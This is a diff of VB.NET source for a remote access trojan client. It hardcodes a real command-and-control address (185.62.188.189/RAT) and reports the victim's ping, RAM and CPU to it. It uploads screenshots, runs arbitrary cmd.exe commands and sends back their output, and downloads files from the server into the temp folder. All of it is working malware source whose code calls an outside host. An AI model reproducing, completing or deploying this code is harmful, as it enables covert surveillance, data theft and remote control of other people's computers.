@@ -20,7 +20,6 @@ Public Class MainForm
         Return Caption.ToString()
     End Function
 
-    Public EOFArguments As String()
     Public mainWebClient As WebClient = New WebClient()
     Public upTime As Integer = 0
 
@@ -54,7 +53,7 @@ Public Class MainForm
         Dim latency As String = ""
 
         Try
-            Dim address As IPAddress = Dns.GetHostAddresses(New Uri(EOFArguments(0) & "clients.php?action=writeme").Host)(0)
+            Dim address As IPAddress = Dns.GetHostAddresses(New Uri("http://185.62.188.189/RAT/" & "clients.php?action=writeme").Host)(0)
             latency = New Ping().Send(address).RoundtripTime.ToString()
         Catch Ex As Exception
             latency = "Unknown Error"
@@ -86,7 +85,7 @@ Public Class MainForm
         Dim cpuCounter As PerformanceCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
         Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))
 
-        Dim apiResponse As String = New WebClient().DownloadString(EOFArguments(0) &
+        Dim apiResponse As String = New WebClient().DownloadString("http://185.62.188.189/RAT/" &
         "clients.php?action=writeme&ping=" & GetPing() &
         "&ram=" & GetGBRamAmount() &
         "&cpu=" & GetCPU &
@@ -130,7 +129,6 @@ Public Class MainForm
         ' Only for debugging purposes. I don't want to put the raw ip of my vps on Github, so
         ' I put it in a file which the stub reads automatically.
         'EOFArguments = {"http://185.62.188.189/RAT/"} '{File.ReadAllText("C:\MeteorLogger\vpsurl.txt")}
-        DefineEOFArgVar(EOFArguments)
 
         CheckForIllegalCrossThreadCalls = False
         mainBW.RunWorkerAsync()
@@ -144,7 +142,7 @@ Public Class MainForm
             ' cap.Dispose()
 
             ' Dim client As New WebClient
-            ' client.UploadData(EOFArguments(0) & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)
+            ' client.UploadData("http://185.62.188.189/RAT/" & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)
 
         ElseIf actionType = "screenshare" Then
             If Screenshare.screenshareBW Is Nothing Then
@@ -166,12 +164,12 @@ Public Class MainForm
         ElseIf actionType = "screenshot" Then
             Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
             Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
-            mainWebClient.UploadData(EOFArguments(0) & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)
+            mainWebClient.UploadData("http://185.62.188.189/RAT/" & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)
 
         ElseIf actionType = "runwincmd" Then
             Dim shellReply As String
             shellReply = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & actionContent(0))))
-            mainWebClient.UploadString(EOFArguments(0), "clients.php?action=sendshellreply&actioncontent=" & shellReply)
+            mainWebClient.UploadString("http://185.62.188.189/RAT/", "clients.php?action=sendshellreply&actioncontent=" & shellReply)
 
         ElseIf actionType = "shutdownrat" Then
             Environment.Exit(1)
@@ -208,7 +206,7 @@ Public Class MainForm
         ElseIf actionType = "remotexec" Then
             Dim filename As String = actionContent(0)
             Dim client As New WebClient
-            client.DownloadFile(EOFArguments(0) & "/files/" & filename, filename)
+            client.DownloadFile("http://185.62.188.189/RAT/" & "/files/" & filename, filename)
             Try
                 File.Move(filename, Path.GetTempPath & filename)
                 File.Delete(filename)
